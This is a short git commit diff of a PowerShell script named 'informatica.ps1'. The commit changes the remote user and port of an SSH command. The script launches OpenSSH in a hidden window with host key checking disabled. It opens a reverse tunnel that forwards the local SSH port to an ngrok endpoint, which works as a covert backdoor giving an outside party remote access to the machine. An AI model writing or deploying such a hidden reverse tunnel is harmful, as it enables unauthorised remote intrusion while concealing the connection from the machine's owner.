66661e157081fbac654f24c8ea574d4739731a1d
usermants <sanchezguy@proton.me>
2025-10-27 18:51:04 -0300

    Update informatica.ps1

--- informatica.ps1
+++ informatica.ps1
@@ -5,7 +5,7 @@ $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 $keyPath = "C:\Users\leandro\.ssh\ssh_key"
 
 # Argumentos da conexão SSH
-$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 4444:localhost:22 u0_434@0.tcp.sa.ngrok.io -p 13654 -N -vvv"
+$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 4444:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 16776 -N -vvv"
 
 # Executa o SSH de forma invisível
 Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
